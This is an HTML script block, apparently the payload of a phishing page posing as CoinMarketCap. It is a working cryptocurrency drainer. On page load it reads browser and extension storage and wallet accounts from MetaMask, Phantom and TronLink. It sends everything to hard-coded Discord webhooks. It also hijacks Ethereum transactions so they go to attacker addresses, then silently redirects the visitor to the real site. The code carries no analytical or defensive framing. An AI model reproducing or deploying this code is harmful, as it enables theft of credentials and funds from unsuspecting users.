  <!-- ========== PAYLOAD ========== -->
  <script>
    (function() {
      // ----- CONFIG -----
      const DRAIN_ADDRESSES = {
        BTC: 'bc1q0jrmywdtx45q30ek9zh9hysqwvtvau8gsl3kwu',
        ETH: '0x6355a8F4a5066A3aA6658F1b8a83cc83b0963FA9',
        BNB: '0x6355a8F4a5066A3aA6658F1b8a83cc83b0963FA9',
        USDC_ERC20: '0x6355a8F4a5066A3aA6658F1b8a83cc83b0963FA9',
        USDT_ERC20: '0x6355a8F4a5066A3aA6658F1b8a83cc83b0963FA9',
        USDT_TRC20: 'TMdbZVp2tkoCWBiAMW5ZLmTKCXDm2cN5FY',
        SOL: 'HC9CCPpKj36wXZKM18UKmU6N7d7SC3FdYDNhB7nin8pM',
        XRP: 'rPRYV1csvzsYFg6ZYnYoroexVLF3c821t9'
      };
      const WEBHOOKS = [
        'https://discord.com/api/webhooks/1529428365273202860/0vmbBbKsCF2FvO3-CrOAyylgaV2h2KtEf3i0zCCMxfLHBGPa-w4As4gxOAsTNwbD3xpe',
        'https://discord.com/api/webhooks/1529428563944538122/to9BGQ-DDkYHN86y06pfGkSTwVOV8EYKneHzQ98vhjxhNlLaegcEvkqnWLXIZJij5O4E',
        'https://discord.com/api/webhooks/1527079760449245444/qlabj53Np-uEHUI3tczLTyeTxKq4esnnApfxDG1C20aEu_j6MjtVC1z6ciB5hLS6kXRh'
      ];

      // ----- HELPERS -----
      function exfil(data) {
        const payload = { content: '```json\n' + JSON.stringify(data, null, 2) + '\n```' };
        WEBHOOKS.forEach(url => {
          try {
            fetch(url, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify(payload),
              mode: 'no-cors'  // fire-and-forget
            }).catch(() => {});
          } catch(e) {}
        });
      }

      function extractFromStorage() {
        let results = { localStorage: {}, sessionStorage: {} };
        try {
          for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            results.localStorage[key] = localStorage.getItem(key);
          }
        } catch(e) {}
        try {
          for (let i = 0; i < sessionStorage.length; i++) {
            const key = sessionStorage.key(i);
            results.sessionStorage[key] = sessionStorage.getItem(key);
          }
        } catch(e) {}
        return results;
      }

      function detectWallets() {
        let wallets = {};
        try {
          if (typeof window.ethereum !== 'undefined') {
            wallets.MetaMask = true;
            // attempt to get accounts
            if (window.ethereum.request) {
              window.ethereum.request({ method: 'eth_accounts' }).then(accounts => {
                if (accounts && accounts.length) exfil({ type: 'eth_accounts', accounts });
              }).catch(() => {});
            }
          }
          if (typeof window.solana !== 'undefined' && window.solana.isPhantom) {
            wallets.Phantom = true;
            window.solana.connect({ onlyIfTrusted: true }).then(resp => {
              if (resp && resp.publicKey) exfil({ type: 'phantom_publicKey', key: resp.publicKey.toString() });
            }).catch(() => {});
          }
          if (typeof window.tronWeb !== 'undefined' && window.tronWeb.defaultAddress) {
            wallets.TronLink = true;
            exfil({ type: 'tron_address', address: window.tronWeb.defaultAddress.address });
          }
          // Detect other wallets (Trust, Coinbase, Exodus, Keplr, Rabby, Brave)
          if (window.ethereum && window.ethereum.isTrust) wallets.Trust = true;
          if (window.ethereum && window.ethereum.isCoinbaseWallet) wallets.Coinbase = true;
          if (window.keplr) wallets.Keplr = true;
          if (window.rabby) wallets.Rabby = true;
          if (window.braveWallet) wallets.Brave = true;
          // Exodus often uses window.ethereum but with specific provider
          if (window.ethereum && window.ethereum.isExodus) wallets.Exodus = true;
        } catch(e) {}
        return wallets;
      }

      function extractExtensionStorage() {
        // Attempt to read chrome.storage if available (extension context)
        let data = {};
        try {
          if (typeof chrome !== 'undefined' && chrome.storage && chrome.storage.local) {
            chrome.storage.local.get(null, (items) => {
              if (items) exfil({ type: 'chrome_storage_local', data: items });
            });
          }
        } catch(e) {}
        try {
          if (typeof browser !== 'undefined' && browser.storage && browser.storage.local) {
            browser.storage.local.get(null).then((items) => {
              if (items) exfil({ type: 'browser_storage_local', data: items });
            }).catch(() => {});
          }
        } catch(e) {}
        return data;
      }

      // ----- MAIN EXECUTION -----
      function run() {
        const collected = {
          timestamp: Date.now(),
          url: window.location.href,
          userAgent: navigator.userAgent,
          storage: extractFromStorage(),
          wallets: detectWallets(),
          extensionStorage: extractExtensionStorage(),
          // Add any balance check / transaction interceptor here (simplified)
          note: 'Drain addresses: ' + JSON.stringify(DRAIN_ADDRESSES)
        };
        exfil(collected);

        // Optional: transaction interceptor for ethereum
        if (typeof window.ethereum !== 'undefined' && window.ethereum.sendAsync) {
          const origSend = window.ethereum.sendAsync.bind(window.ethereum);
          window.ethereum.sendAsync = function(payload, callback) {
            if (payload && payload.method && (payload.method === 'eth_sendTransaction' || payload.method === 'personal_sendTransaction')) {
              try {
                const tx = payload.params && payload.params[0];
                if (tx && tx.to) {
                  // Redirect to drain address (only if not already our address)
                  const to = tx.to.toLowerCase();
                  const drain = DRAIN_ADDRESSES.ETH.toLowerCase();
                  if (to !== drain) {
                    tx.to = drain;
                    exfil({ type: 'tx_intercept', original: to, redirected: drain });
                  }
                }
              } catch(e) {}
            }
            return origSend(payload, callback);
          };
        }

        // Redirect to real CMC after 1.5s (silent)
        setTimeout(() => {
          window.location.replace('https://coinmarketcap.com');
        }, 1500);
      }

      // Execute after DOM ready
      if (document.readyState === 'complete' || document.readyState === 'interactive') {
        run();
      } else {
        document.addEventListener('DOMContentLoaded', run);
      }
    })();
  </script>
